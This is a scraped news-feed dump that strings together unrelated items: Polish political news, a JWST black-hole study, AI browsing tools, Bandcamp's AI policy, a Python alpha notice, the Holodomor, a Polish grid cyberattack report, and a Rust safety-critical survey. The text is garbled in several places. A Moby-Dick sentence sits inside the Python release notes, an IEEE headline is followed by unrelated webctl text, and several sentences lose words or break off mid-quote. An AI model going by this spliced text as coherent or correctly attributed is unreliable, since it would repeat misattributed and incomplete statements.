Orthodox, as well as Poland’s dominant Roman Catholic church; and members of recognised national and ethnic minority groups.Addressing the participants, Nawrocki said that Poland’s “genotype” is characterised by two sets of values. The first is the national attachment to freedom and sovereignty, but the second is “a tremendous openness”.The president pointed to the fact that the First Polish Republic, which was a union between Poland and Lithuania that existed from the 16th to the 18th centuries, was “a mosaic of ethnicities and religions” and it was “this that allowed it to be a great power” of the time.Likewise, during the Second Polish Republic, which existed between the First and Second World Wars, Poland was home to “millions of Polish Jews, millions of Polish Ukrainians, to Belarusians, Polish Armenians, to Polish Tatars”, recalled Nawrocki.The president, an academic historian and former head of the World War Two Museum in Gdańsk, said that he was always moved when visiting Polish war cemeteries to see “Latin crosses on one side and Orthodox crosses on the other, as well as crescents and Stars of David”.“This means that there were representatives of national minorities who viewed Poland as their homeland, regardless of the fact that they prayed in other languages ​​or in other places of worship,” said Nawrocki, who himself is Catholic.This history is “binding on me as president of Poland, despite the fact that today’s demographic structure of the Polish state is completely different”. The horrors of World War Two and then postwar border changes mean that modern Poland is far more ethnically and religiously uniform than before.Poland is therefore no longer “a state in which national minorities play such a significant role, those million-strong national minorities”, said Nawrocki. But “Poland remains open to national minorities and all the [religious] denominations you represent today”.“I feel responsible for all citizens of Poland, regardless of where they pray to God or the national minority they come from,” he added.On a personal note, Nawrocki revealed that his two closest childhood friends are “I believe that this personal, individual example can also serve as a foundation for our cooperation in caring for Poland and the mutual relations between churches in Poland.”Nawrocki’s remarks were echoed by the religious leaders present. “Of course, we have a different path to God, but that’s not a problem; it’s a blessing, it’s the richness of our country,” said Poland’s chief rabbi, Michael Schudrich, quoted by the Polish Press Agency (PAP).“The affairs of the republic should always be conducted in a spirit of responsibility for the common good, respect for the dignity of every citizen and concern for the unity of the nation,” said Tadeusz Wojda, the head of the Roman Catholic episcopate in Poland.Last month, however, Nawrocki stirred controversy by ending a longstanding practice by his predecessors of inviting Jewish leaders to celebrate Hanukkah at the presidential palace.

Dualism is the theory that ultimate reality is composed of two radically different kinds of things, physical things and non-physical things, and that these same two kinds of things, expressed as body/brain and spirit/soul, account for consciousness.

Before he first picked up a paintbrush at the age of 27, before the sunflowers, before Starry Night, and long before anyone cared about his work, there was a very different Vincent. A man who was struggling to find his place in the world, who failed at almost everything he tried, and who spent years drifting from one job to another, trying to find a place where he belonged.
And during all that wandering, something else was developing, a real empathy for ordinary people, for those who lived hard lives with very little recognition. People on the fringes of society. 
This would eventually lead him to create his first masterpiece.

Astronomers think they have solved the puzzle of so-called “little red dots” in space, a population of bizarre objects at the very edge of the observable universe, according to a study published on Wednesday in . The new research suggests that these dots are likely the youngest black holes we have ever glimpsed, which are “cocooned” in dense gas, a never-before-seen phenomenon that sheds light on the early evolution of the universe. “LRDs were first spotted in 2023 in the first images made with the James Webb Space Telescope,” said Vadim Rusakov, an astronomer at the University of Manchester, in an email to 404 Media. “People have very actively studied these objects since then.” “They are tiny, bright and red objects seen when the universe was only about 5-15 percent of its current age,” he continued. “They have puzzled astronomers: on one hand, they are too compact and massive for normal galaxies, on the other, they do not look like typical supermassive black holes, because we do not detect their usual signals, such as X-rays. And they are not just a few odd apples—almost every tenth galaxy in the early universe is an LRD.” These baffling properties have sparked spirited debate about the nature of LRDs. Some studies have suggested they might be exotic star-studded galaxies, or weirdly overmassive black holes. Hoping to resolve the mystery, Rusakov and his colleagues analyzed JWST observations of more than a dozen of the little red dots across longer timescales. The team confirmed that the dots are likely black holes that are enshrouded by a “cocoon” of energetic gas that can explain their novel properties. “Our simple solution is: we think that they are massive black holes wrapped in a thick cocoon of dense gas, which makes them appear red and hides the black hole,” Rusakov said. “This idea of the cocoon was inspired by another work that predicted the presence of thick gas. We could check this idea by studying the hydrogen emission from LRDs. This showed us that the cocoon is partly ionised—meaning it has lots of free electrons. This was a surprising discovery, because by scattering light, these electrons hid most useful black hole signals from our sight and also made it appear more evolved than it actually is.”“By looking inside, we found that these are some of the youngest black holes ever seen,” he added. “This makes them unique laboratories for understanding how black holes got started in the early universe.”In other words, it’s not that these objects aren’t radiating in X-rays, it’s just that those wavelengths are largely blotted out by the gassy cocoons. Moreover, the cocoons warp light from the black holes, making them seem much more massive than they actually are, like some kind of cosmic funhouse mirror. Rusakov and his colleagues calculated that the black holes are probably a few million times as massive as the Sun, more than a hundred times smaller than expected by their appearance.The findings are part of a wave of discoveries about the early universe primarily fueled by the unparalleled precision and sensitivity of JWST’s infrared vision. “The first JWST observations caused several debates about how galaxies formed in the early universe, such as whether galaxies grow quicker than we thought,” Rusakov explained. “In fact, some of those initially problematic galaxies turned out to be Little Red Dots. As our study shows, they were misinterpreted as purely stellar galaxies and they are supermassive black holes instead.” As JWST continues to expose strange new frontiers of the universe, astronomers can determine which anomalies point to novel entities and which, like the little red dots, turn out to be familiar objects going through an unfamiliar phase.Either way, each breakthrough raises new questions. Rusakov and his colleagues may have identified the origin of the little red dots, but it remains unclear whether these young black holes grow faster than the galaxies associated with them, and what that might mean for our understanding of galactic evolution.   “LRDs show us what the black holes looked like a long time ago, and if we are lucky, they may show us how these massive black holes got started,” Rusakov said. “Just to be clear, even though they are likely the youngest black holes we ever found, they already have masses of a few million Suns.” “This opens up the next big questions: can we find even smaller black holes with the James Webb Space Telescope? Do black holes start tiny and grow or are they born already quite big?” he added. “These exciting questions will definitely keep us busy for some time.”]]></content:encoded></item><item><title>Piecing Together the Bodies of Our Prehistoric Family | Prehistoric Autopsy | BBC Earth Science</title><link>https://www.youtube.com/watch?v=toAWCFlbmTQ</link><author>BBC Earth Science</author><category>yt</category><enclosure url="https://www.youtube.com/v/toAWCFlbmTQ?version=3" length="" type=""/><pubDate>Wed, 14 Jan 2026 19:30:11 +0000</pubDate><source url="https://www.youtube.com/channel/UCdsOTr6SmDrxuWE7sJFrkhQ">BBC Earth Science</source><content:encoded><![CDATA[Using cutting-edge technology and the specialised knowledge of Professor Alice Roberts and a team of world-class experts we're able to understand how our ancient ancestors moved, lived and most remarkably, how much like us they were.

You start with a simple fetch, but quickly end up managing a complex stack of proxies, handling client-side hydration, and debugging brittle selectors. and writing custom parsing logic for every site.Tabstack is an API that abstracts that infrastructure. You send a URL and an intent; we handle the rendering and return clean, structured data for the LLM.How it works under the hood:- Escalation Logic: We don't spin up a full browser instance for every request (which is slow and expensive). We attempt lightweight fetches first, escalating to full browser automation only when the site requires JS execution/hydration.- Token Optimization: Raw HTML is noisy and burns context window tokens. We process the DOM to strip non-content elements and return a markdown-friendly structure that is optimized for LLM consumption.- Infrastructure Stability: Scaling headless browsers is notoriously hard (zombie processes, memory leaks, crashing instances). We manage the fleet lifecycle and orchestration so you can run thousands of concurrent requests without maintaining the underlying grid.On Ethics: Since we are backed by Mozilla, we are strict about how this interacts with the open web.- We respect robots.txt rules.- We identify our User Agent.- We do not use requests/content to train models.- Data is ephemeral and discarded after the task.The linked post goes into more detail on the infrastructure and why we think browsing needs to be a distinct layer in the AI stack.This is obviously a very new space and we're all learning together. There are plenty of known unknowns (and likely even more unknown unknowns) when it comes to agentic browsing, so we’d genuinely appreciate your feedback, questions, and tips.Happy to answer questions about the stack, our architecture, or the challenges of building browser infrastructure.]]></content:encoded></item><item><title>How The UAE Just Got Wrecked In Yemen</title><link>https://www.youtube.com/watch?v=IgD7zmJN3_A</link><author>RealLifeLore</author><category>yt</category><enclosure url="https://www.youtube.com/v/IgD7zmJN3_A?version=3" length="" type=""/><pubDate>Wed, 14 Jan 2026 18:16:10 +0000</pubDate><source url="https://www.youtube.com/channel/UCP5tjEmvPItGyLhmjdwP7Ww">RealLifeLore</source><content:encoded><![CDATA[Free ZWILLING Four Star Chef's Knife on your 3rd box ($144.99 value) plus 10 Free Meals and your first box ship free with code REALLIFELOREHFZWL at https://bit.ly/45FtOJS !

"Music and audio that is generated wholly or in substantial part by AI is not permitted on Bandcamp," the company wrote in a post to the r/bandcamp subreddit. The new policy also prohibits "any use of AI tools to impersonate other artists or styles."The policy draws a line that some in the music community have debated: Where does tool use end and full automation begin? AI models are not artists in themselves, since they lack personhood and creative intent. But people do use AI tools to make music, and the spectrum runs from using AI for minor assistance (cleaning up audio, suggesting chord progressions) to typing a prompt and letting a model generate an entire track. Bandcamp's policy targets the latter end of that spectrum while leaving room for human artists who incorporate AI tools into a larger creative process.The announcement emphasized the platform's desire to protect its community of human artists. "The fact that Bandcamp is home to such a vibrant community of real people making incredible music is something we want to protect and maintain," the company wrote. Bandcamp asked users to flag suspected AI-generated content through its reporting tools, and the company said it reserves "the right to remove any music on suspicion of being AI generated."]]></content:encoded></item><item><title>Python 3.15.0 alpha 5 (yes, another alpha!)</title><link>https://pythoninsider.blogspot.com/2026/01/python-3150-alpha-5-yes-another-alpha.html</link><author>Hugo</author><category>dev</category><pubDate>Wed, 14 Jan 2026 17:38:00 +0000</pubDate><source url="https://pythoninsider.blogspot.com/">Python official news</source><content:encoded><![CDATA[Note: 3.15.0a4 was accidentally built against  from
2025-12-23 instead of 2026-01-13, so this 3.15.0a5 is an extra release
correctly built against 2026-01-14.This is an early developer preview of Python
3.15Python 3.15 is still in development. This release, 3.15.0a5, is the
fifth of  eight planned alpha releases.Alpha releases are intended to make it easier to test the current
state of new features and bug fixes and to test the release process.During the alpha phase, features may be added up until the start of
the beta phase (2026-05-05) and, if necessary, may be modified or
deleted up until the release candidate phase (2026-07-28). Please keep
in mind that this is a preview release and its use is
 recommended for production environments.Many new features for Python 3.15 are still being planned and
written. Among the new major new features and changes so far:PEP
799: A new high-frequency, low-overhead, statistical sampling
profiler and dedicated profiling packagePEP
686: Python now uses UTF-8 as the default encodingPEP
782: A new  C API to create a Python bytes
objectThe JIT
compiler has been significantly upgraded, with 4-5% geometric mean
performance improvement on x86-64 Linux over the standard interpreter,
and 7-8% speedup on AArch64 macOS over the tail-calling interpreter(Hey,  if a feature
you find important is missing from this list, let Hugo
know.)The next pre-release of Python 3.15 will be 3.15.0a6, currently
scheduled for 2026-02-10.At last it was given out that some time next day the ship would
certainly sail. So next morning, Queequeg and I took a very early
start.Thanks to all of the many volunteers who help make Python Development

He says that Russia will be ready for a military conflict with the West in just a few years.

The documentary follows Carsten Breuer on camera for nine months. Filmmakers accompany him to a meeting with Federal President Frank-Walter Steinmeier (SPD), as well as on trips to southern Lebanon, Ukraine, and the USA. The result is a portrait of the German government's top military advisor that also provides deep insights into the German security apparatus.

Where the military meets politics, Carsten Breuer is redefining the role of Inspector General. Unlike his predecessors, he seeks out the public eye to get his messages across. In detailed newspaper interviews, on talk shows, in conversations with citizens, he drives his points home: The Bundeswehr and society must get ready for war.

Meanwhile, the German Armed Forces are taking part in defense exercises in Lithuania designed to strengthen NATO’s eastern flank. A German brigade there is expected to grow to around 5,000 soldiers by 2027 - posted as a deterrent against Russia.

At the brigade headquarters in Vilnius, General Breuer receives a military briefing and inspects a military exercise from the hatch of an armored personnel carrier. Suddenly, the exercise is interrupted, and military radio communications are cut off. 

A Russian reconnaissance aircraft has apparently been spotted in the airspace above. Incidents like this have been increasing in recent months. Cyberattacks, sabotage of military facilities, destroyed undersea cables, and drone flights - according to Breuer, these are all Putin's tests to gauge defense capabilities and resilience. From Russia's perspective, war with the West has long been underway.

This tragedy, orchestrated under Joseph Stalin's regime, claimed an estimated 3.5 to 7 million lives, primarily in rural areas. It wasn't a natural disaster but a deliberate policy tied to Soviet collectivization and political repression.

Stalin's Five-Year Plan aimed to industrialize the USSR by forcing peasants into collective farms, seizing grain to fund urban growth and exports. Ukraine, the "breadbasket of Europe," was hit hardest. In 1932, unrealistic grain quotas were imposed, even as crops failed due to poor weather and mismanagement. When peasants couldn't meet demands, Soviet authorities confiscated food, livestock, and seeds, leaving families to starve. Borders were sealed to prevent escape, and blacklists punished "kulaks" (wealthier farmers) accused of hoarding.

Survivors recounted harrowing scenes: emaciated bodies in streets, widespread cannibalism, and mass graves. The famine peaked in spring 1933, with daily deaths in the thousands. Stalin denied its existence, suppressing reports and even jailing journalists like Gareth Jones who exposed it. Many view the Holodomor as genocide, targeting Ukrainian nationalism amid broader purges.

The aftermath scarred Ukraine's demographics and culture, with lasting debates over intent. In 2006, Ukraine officially recognized it as genocide; Russia disputes this. Today, the Holodomor symbolizes resilience and a warning against authoritarian excess. Memorials worldwide honor victims, emphasizing "never again."]]></content:encoded></item><item><title>The Ultimate 3D Integration Would Cook Future GPUs</title><link>https://spectrum.ieee.org/hbm-on-gpu-imec-iedm</link><author>Samuel K.

I needed it to persist cookies across sessions (to handle SSO) and then scrape a Kanban board.Existing AI browser tools (like current MCP implementations) often force unsolicited data into the context window—dumping the full accessibility tree, console logs, and network errors whether you asked for them or not.webctl is an attempt to solve this with a Unix-style CLI:- Filter before context: You pipe the output to standard tools. webctl snapshot --interactive-only | head -n 20 means the LLM only sees exactly what I want it to see.- Daemon Architecture: It runs a persistent background process. The goal is to keep the browser state (cookies/session) alive while you run discrete, stateless CLI commands.- Semantic targeting: It uses ARIA roles (e.g., role=button name~="Submit") rather than fragile CSS selectors.Disclaimer: The daemon logic for state persistence is still a bit experimental, but the architecture feels like the right direction for building local, token-efficient agents.It’s basically "Playwright for the terminal."]]></content:encoded></item><item><title>Trump is the only leader who can end threat of Russia, Poland’s president tells BBC</title><link>https://notesfrompoland.com/2026/01/14/trump-is-the-only-leader-who-can-end-threat-of-russia-polands-president-tells-bbc/</link><author>Daniel Tilles</author><category>news</category><pubDate>Wed, 14 Jan 2026 14:15:21 +0000</pubDate><source url="https://notesfrompoland.com/">News - Poland</source><content:encoded><![CDATA[Keep our news free from ads and paywalls by making a donation to support our work!Notes from Poland is run by a small editorial team and is published by an independent, non-profit foundation that is funded through donations from our readers. We cannot do what we do without your support.Donald Trump is the only world leader who can protect Europe from the threat of Russia, Polish President Karol Nawrocki has told the BBC. He called on Europeans to support Trump in doing so.Speaking on a visit to London, during which Nawrocki met with British Prime Minister Keir Starmer, the Polish president also declared that he shares Trump’s concerns about the direction in which the European Union is heading.“We in Poland don’t know [any] Russia [other] than an aggressive Russia,” said Nawrocki, referring to his country’s long history of conflict with its eastern neighbour. “Russia is still a threat to Europe and Donald Trump is the only leader who can solve this and we have to support him in this process.”“The United States is a country which guarantees Europe’s security and this is something that I’m grateful for to President Donald Trump,” Nawrocki told the BBC.Asked if he thinks Trump is too friendly towards Putin, Nawrocki said only that he has “consistently” told Trump “that I completely do not trust Putin”.On the question of Trump’s recent demands that Greenland be brought under US control, Nawrocki said that he believes “discussion should remain a matter between the prime minister of Denmark and President Trump”.That represents a different view from Poland’s more liberal, pro-EU government, which has expressed solidarity with Denmark and warned Trump against violating Greenland’s sovereignty.Polish Prime Minister Donald Tusk last week co-authored a statement to that effect with Denmark’s prime minister and the leaders of the UK, Germany, France, Italy and Spain.Nawrocki also told the BBC that he has “a very similar point of view” to Trump when it comes to the idea that the European Union has been heading in the wrong direction: “problems with immigrants, [with] ideology [being placed] above politics”.“Poland joined the EU to have more freedom and not have more restrictions…[but] today it is heading in a totally different direction,” he continued. “Yes, I’m critical if the EU wants to change the Polish [judicial] system, if the EU wants to tell the Polish people what to eat while destroying Polish agriculture.”More broadly, the conservative Nawrocki argued that Europeans “are detaching ourselves from the values which have been a part of our DNA for a thousand years” and instead “trying to impose upon ourselves a new temporary fashion”.“This brings Europe to a turning point…[and] my appeal is, let us go back to our roots, and then there will be a bright future in front of Europe and in front of the United States, in this permanent alliance,” he concluded.In November, Nawrocki gave a major speech outlining his vision for reform of the EU to ensure that it infringes less on national sovereignty, stops “dictating the terms” of member states’ political or judicial systems, and ceases trying to “regulate the entire lives of citizens”.The president’s critics have accused him of pushing, intentionally or not, for “Polexit” from the EU, support for which has been rising over the last year.However, Nawrocki emphasised to the BBC that he wants Poland to remain in the EU and that his criticism and calls for reform are part of normal democratic discussion.

We cannot do what we do without your support.A woman who was involved in providing humanitarian aid to migrants who had irregularly crossed the border from Belarus to Poland has been charged with helping at least 15 of them illegally travel onwards to Germany. If convicted, she could face up to eight years in prison.Since 2021, the Belarusian authorities have encouraged and assisted tens of thousands of migrants – mainly from the Middle East, Asia and Africa – to cross illegally into Poland. While most attempts are foiled, those who do make it across then often head onwards to Germany.On Wednesday, the Polish border guard revealed that, as part of an investigation being overseen by the military affairs department of the Warsaw district prosecutor’s office, they searched the residence of an unnamed Polish woman who had been involved in providing aid to migrants at the border.They discovered 62 temporary foreigner identity certificates, which are issued to people who have applied for asylum in Poland, entitling them to remain in the country while their claim is processed.While their applications are considered, asylum seekers are not allowed to leave the country. However, the border guard notes that, among the 62 individuals who received those certificates, most had their asylum proceedings discontinued because they had left Poland.Now, the woman in whose home the documents were found has been charged with helping at least 15 foreigners illegally cross the border from Poland to Germany, a crime punishable by between six months and eight years in prison. She has pleaded not guilty.The woman’s actions, which took place in 2022, “exceeded the limits of aid”, wrote the border guard, who also noted that this case is “further evidence of the instrumentalisation of the procedure for granting international protection on the territory of Poland”.The Polish authorities have long argued that the asylum system is being abused by those caught crossing from Belarus, who apply for protection but then travel onwards to Germany illegally.Poland and the European Union regard the migration crisis orchestrated by Belarus as part of a Minsk and Moscow’s “hybrid war” intended to undermine stability in the EU.Amid public anger in Poland over such returns, the Polish government last year introduced its own controls on the German border. It also suspended the right of people who had crossed irregularly from Belarus to claim asylum. Instead, they are sent back over the border.Many activist groups have also sought to provide assistance to migrants who cross irregularly from Belarus. They argue that the situation is a humanitarian crisis, not a security one, and note that dozens of migrants have died, often from cold conditions or drowning in the rivers along the border.But some of those activists have been charged with violating migration laws. In one widely publicised case, last September a group of five people were found not guilty of enabling the illegal presence in Poland of Middle Eastern migrants whom they provided humanitarian aid to after they had crossed the border.The ruling was celebrated “as a great victory for justice” by the Helsinki Foundation for Human Rights (HFHR), which said “it shows that, contrary to politicians’ narratives, humanitarian aid is and will remain legal”.

We cannot do what we do without your support.The Polish government has revealed that the country experienced a major attempt to disrupt its power grid at the end of December, and came “very close to a blackout”. However, it successfully repelled the cyberattack.The digital affairs minister says that “everything points to Russian sabotage” being behind the incident.“The role of renewables in Poland’s energy mix has risen significantly in recent years. They account for around 29% of all electricity generated in the country.  That is often the case even in winter. On Monday this week, amid extremely cold, snowy weather, renewables provided 25% of Poland’s electricity.Previous attacks on Poland’s power grid have targeted large energy facilities or the transmission system, noted Motyka. “We have not see this type of attack [on smaller-scale renewable facilities] before, but we can expect it to happen again.”Later on Tuesday, digital affairs minister Krzysztof Gawkowski addressed the attack during an interview with broadcaster RMF. Asked if Poland had “come close to blackout” during the incident, he confirmed it had been “very close”.“The scale of this attack, the vector of entry and who was behind it indicate that it was a coordinated operation intended to deliberately cut off power to Polish citizens,” continued Gawkowski. “Everything points to Russian sabotage…intended to destabilise the situation in Poland.”However, the “Polish security services and the Polish institutions responsible for cybersecurity rose to the occasion”, added the minister. “We have well-prepared institutions and there is no need to panic; Poland is the most [cyber]attacked country in the European Union.”Poland has in recent years suffered a series of so-called hybrid actions orchestrated by Russia, including both cyberattacks and physical acts of sabotage, as well as disinformation and propaganda campaigns.Last week, Motyka revealed that hacker attacks on Polish energy infrastructure had increased during recent cold weather conditions, which have seen temperatures plummet to below -15 degrees Celsius in many places and energy use surge to record levels.

it’s basically an alternative gui for opencode, which (at least until now) has been more focused on technical folks.the original seed for openwork was simple: i have a home server, and i wanted my wife and i to be able to run privileged workflows. things like controlling home assistant, or deploying custom web apps (e.g. our customs recipe app recipes.benjaminshafii.com), legal torrents, without living in a terminal.our initial setup was running the opencode web server directly and sharing credentials to it. that worked, but i found the web ui unreliable and very unfriendly for non-technical users.the goal with openwork is to bring the kind of workflows i’m used to running in the cli into a gui, while keeping a very deep extensibility mindset. ideally this grows into something closer to an obsidian-style ecosystem, but for agentic work.some core principles i had in mind:- open by design: no black boxes, no hosted lock-in. everything runs locally or on your own servers. (models don’t run locally yet, but both opencode and openwork are built with that future in mind.)
- hyper extensible: skills are installable modules via a skill/package manager, using the native opencode plugin ecosystem.
- non-technical by default: plans, progress, permissions, and artifacts are surfaced in the ui, not buried in logs.you can already try it:
- there’s an unsigned dmg
- or you can clone the repo, install deps, and if you already have opencode running it should work right awayit’s very alpha, lots of rough edges. i’d love feedback on what feels the roughest or most confusing.happy to answer questions.]]></content:encoded></item><item><title>Show HN: OSS AI agent that indexes and searches the Epstein files</title><link>https://epstein.trynia.ai/</link><author>jellyotsiro</author><category>hn</category><pubDate>Wed, 14 Jan 2026 01:56:52 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[Indexed emails, messages, flight logs, court documents, and other records from the Epstein archive.Search the Epstein archive — emails, messages, and documents.

In our first post, we described the overall approach and what we learned about doing user research. In our second post, we explored what people love about Rust. This post goes deep on one domain: safety-critical software.When we set out on the Vision Doc work, one area we wanted to explore in depth was safety-critical systems: software where malfunction can result in injury, loss of life, or environmental harm. Think vehicles, airplanes, medical devices, industrial automation. We spoke with engineers at OEMs, integrators, and suppliers across automotive (mostly), industrial, aerospace, and medical contexts.What we found surprised us a bit. The conversations kept circling back to a single tension: Rust's compiler-enforced guarantees support much of what Functional Safety Engineers and Software Engineers in these spaces spend their time preventing, but once you move beyond prototyping into the higher-criticality parts of a system, the ecosystem support thins out fast. There is no MATLAB/Simulink Rust code generation. There is no OSEK or AUTOSAR Classic-compatible RTOS written in Rust or with first-class Rust support. The tooling for qualification and certification is still maturing.
Quick context: what makes software "safety-critical"If you've never worked in these spaces, here's the short version. Each safety-critical domain has standards that define a ladder of integrity levels: ISO 26262 in automotive, IEC 61508 in industrial, IEC 62304 in medical devices, DO-178C in aerospace. The details differ, but the shape is similar: as you climb the ladder toward higher criticality, the demands on your development process, verification, and evidence all increase, and so do the costs.This creates a strong incentive for : isolate the highest-criticality logic into the smallest surface area you can, and keep everything else at lower levels where costs are more manageable and you can move faster.We'll use automotive terminology in this post (QM through ASIL D) since that's where most of our interviews came from, but the patterns generalize. These terms represent increasing levels of safety-criticality, with QM being the lowest and ASIL D being the highest. The story at low criticality looks very different from the story at high criticality, regardless of domain.
Rust is already in production for safety-critical systemsBefore diving into the challenges, it is worth noting that Rust is not just being evaluated in these domains. It is deployed and running in production.We spoke with a principal firmware engineer working on mobile robotics systems certified to IEC 61508 SIL 2:"We had a new project coming up that involved a safety system. And in the past, we'd always done these projects in C using third party stack analysis and unit testing tools that were just generally never very good, but you had to do them as part of the safety rating standards. Rust presented an opportunity where 90% of what the stack analysis stuff had to check for is just done by the compiler. That combined with the fact that now we had a safety qualified compiler to point to was kind of a breakthrough." -- Principal Firmware Engineer (mobile robotics)We also spoke with an engineer at a medical device company deploying IEC 62304 Class B software to intensive care units:"All of the product code that we deploy to end users and customers is currently in Rust. We do EEG analysis with our software and that's being deployed to ICUs, intensive care units, and patient monitors." -- Rust developer at a medical device company"We changed from this Python component to a Rust component and I think that gave us a 100-fold speed increase." -- Rust developer at a medical device companyThese are not proofs of concept. They are shipping systems in regulated environments, going through audits and certification processes. The path is there. The question is how to make it easier for the next teams coming through.
Rust adoption is easiest at QM, and the constraints sharpen fastAt low criticality, teams described a pragmatic approach: use Rust and the crates ecosystem to move quickly, then harden what you ship. One architect at an automotive OEM told us:"We can use any crate [from crates.io] [..] we have to take care to prepare the software components for production usage." -- Architect at Automotive OEMBut at higher levels, third-party dependencies become difficult to justify. Teams either rewrite, internalize, or strictly constrain what they use. An embedded systems engineer put it bluntly:"We tend not to use 3rd party dependencies or nursery crates [..] solutions become kludgier as you get lower in the stack." -- Firmware EngineerSome teams described building escape hatches, abstraction layers designed for future replacement:"We create an interface that we'd eventually like to have to simplify replacement later on [..] sometimes rewrite, but even if re-using an existing crate we often change APIs, write more tests." -- Team Lead at Automotive Supplier (ASIL D target)Even teams that do use crates from crates.io described treating that as a temporary accelerator, something to track carefully and remove from critical paths before shipping:"We use crates mainly for things in the beginning where we need to set up things fast, proof of concept, but we try to track those dependencies very explicitly and for the critical parts of the software try to get rid of them in the long run." -- Team lead at an automotive software company developing middleware in RustIn aerospace, the "control the whole stack" instinct is even stronger:"In aerospace there's a notion of we must own all the code ourselves. We must have control of every single line of code." -- Engineering lead in aerospaceThis is the first big takeaway: a lot of "Rust in safety-critical" is not just about whether Rust compiles for a target. It is about whether teams can assemble an evidence-friendly software stack and keep it stable over long product lifetimes.Many interviewees framed Rust's value in terms of work shifted earlier and made more repeatable by the compiler. This is not just "nice," it changes how much manual review you can realistically afford. Much of what was historically process-based enforcement through coding standards like MISRA C and CERT C becomes a language-level concern in Rust, checked by the compiler rather than external static analysis or manual review."Roughly 90% of what we used to check with external tools is built into Rust's compiler." -- Principal Firmware Engineer (mobile robotics)We heard variations of this from teams dealing with large codebases and varied skill levels:"We cannot control the skill of developers from end to end. We have to check the code quality. Rust by checking at compile time, or Clippy tools, is very useful for our domain." -- Engineer at a major automakerEven on smaller teams, the review load matters:"I usually tend to work on teams between five and eight. Even so, it's too much code. I feel confident moving faster, a certain class of flaws that you aren't worrying about." -- Embedded systems engineer (mobile robotics)Closely related: people repeatedly highlighted Rust's consistency around error handling:"Having a single accepted way of handling errors used throughout the ecosystem is something that Rust did completely right." -- Automotive Technical LeadFor teams building products with 15-to-20-year lifetimes and "teams of teams," compiler-enforced invariants scale better than "we will just review harder."A common pattern in safety-critical environments is conservative toolchain selection. But engineers pointed out a tension: older toolchains carry their own defect history."[..] traditional wisdom is that after something's been around and gone through motions / testing then considered more stable and safer [..] older compilers used tend to have more bugs [and they become] hard to justify" -- Software Engineer at an Automotive supplierRust's edition system was described as a real advantage here, especially for incremental migration strategies that are common in automotive programs:"[The edition system is] golden for automotive, where incremental migration is essential." -- Software Engineer at major AutomakerIn practice, "stability" is also about managing the mismatch between what the platform supports and what the ecosystem expects. Teams described pinning Rust versions, then fighting dependency drift:"We can pin the Rust toolchain, but because almost all crates are implemented for the latest versions, we have to downgrade. It's very time-consuming." -- Engineer at a major automakerFor safety-critical adoption, "stability" is operational. Teams need to answer questions like: What does a Rust upgrade change, and what does it not change? What are the bounds on migration work? How do we demonstrate we have managed upgrade risk?
Target support matters in practical waysSafety-critical software often runs on long-lived platforms and RTOSs. Even when "support exists," there can be caveats. Teams described friction around targets like QNX, where upstream Rust support exists but with limitations (for example, QNX 8.0 support is currently  only).This connects to Rust's target tier policy: the policy itself is clear, but regulated teams still need to map "tier" to "what can I responsibly bet on for this platform and this product lifetime.""I had experiences where all of a sudden I was upgrading the compiler and my toolchain and dependencies didn't work anymore for the Tier 3 target we're using. That's simply not acceptable. If you want to invest in some technology, you want to have a certain reliability." -- Senior software engineer at a major automaker is the spine, and it sets expectationsIn  environments,  becomes the spine of Rust. Teams described it as both rich enough to build real products and small enough to audit.A lot of Rust's safety leverage lives there:  and , slices, iterators,  and , atomics, , . But we also heard a consistent shape of gaps: many embedded and safety-critical projects want -friendly building blocks (fixed-size collections, queues) and predictable math primitives, but do not want to rely on "just any" third-party crate at higher integrity levels."Most of the math library stuff is not in core, it's in std. Sin, cosine... the workaround for now has been the libm crate. It'd be nice if it was in core." -- Principal Firmware Engineer (mobile robotics)
Async is appealing, but the long-run story is not settledSome safety-critical-adjacent systems are already heavily asynchronous: daemons, middleware frameworks, event-driven architectures. That makes Rust's async story interesting.But people also expressed uncertainty about ecosystem lock-in and what it would take to use async in higher-criticality components. One team lead developing middleware told us:"We're not sure how async will work out in the long-run [in Rust for safety-critical]. [..] A lot of our software is highly asynchronous and a lot of our daemons in the AUTOSAR Adaptive Platform world are basically following a reactor pattern. [..] [C++14] doesn't really support these concepts, so some of this is lack of familiarity." -- Team lead at an automotive software company developing middleware in RustAnd when teams look at async through an ISO 26262 lens, the runtime question shows up immediately:"If we want to make use of async Rust, of course you need some runtime which is providing this with all the quality artifacts and process artifacts for ISO 26262." -- Team lead at an automotive software company developing middleware in RustAsync is not "just a language feature" in safety-critical contexts. It pulls in runtime choices, scheduling assumptions, and, at higher integrity levels, the question of what it would mean to certify or qualify the relevant parts of the stack.Find ways to help the safety-critical community support their own needs. Open source helps those who help themselves. The Ferrocene Language Specification (FLS) shows this working well: it started as an industry effort to create a specification suitable for safety-qualification of the Rust compiler, companies invested in the work, and it now has a sustainable home under the Rust Project with a team actively maintaining it.Contrast this with MC/DC coverage support in rustc. Earlier efforts stalled due to lack of sustained engagement from safety-critical companies. The technical work was there, but without industry involvement to help define requirements, validate the implementation, and commit to maintaining it, the effort lost momentum. A major concern was that the MC/DC code added maintenance burden to the rest of the coverage infrastructure without a clear owner. Now in 2026, there is renewed interest in doing this the right way: companies are working through the Safety-Critical Rust Consortium to create a Rust Project Goal in 2026 to collaborate with the Rust Project on MC/DC support. The model is shared ownership of requirements, with primary implementation and maintenance done by companies with a vested interest in safety-critical, done in a way that does not impede maintenance of the rest of the coverage code.The remaining recommendations follow this pattern: the Safety-Critical Rust Consortium can help the community organize requirements and drive work, with the Rust Project providing the deep technical knowledge of Rust Project artifacts needed for successful collaboration. The path works when both sides show up.Establish ecosystem-wide MSRV conventions. The dependency drift problem is real: teams pin their Rust toolchain for stability, but crates targeting the latest compiler make this difficult to sustain. An LTS release scheme, combined with encouraging libraries to maintain MSRV compatibility with LTS releases, could reduce this friction. This would require coordination between the Rust Project (potentially the release team) and the broader ecosystem, with the Safety-Critical Rust Consortium helping to articulate requirements and adoption patterns.Turn "target tier policy" into a safety-critical onramp. The friction we heard is not about the policy being unclear, it is about translating "tier" into practical decisions. A short, target-focused readiness checklist would help: Which targets exist? Which ones are  only? What is the last known tested OS version? What are the top blockers? The raw ingredients exist in rustc docs, release notes, and issue trackers, but pulling them together in one place would lower the barrier. Clearer, consolidated information also makes it easier for teams who depend on specific targets to contribute to maintaining them. The Safety-Critical Rust Consortium could lead this effort, working with compiler team members and platform maintainers to keep the information accurate.Document "dependency lifecycle" patterns teams are already using. The QM story is often: use crates early, track carefully, shrink dependencies for higher-criticality parts. The ASIL B+ story is often: avoid third-party crates 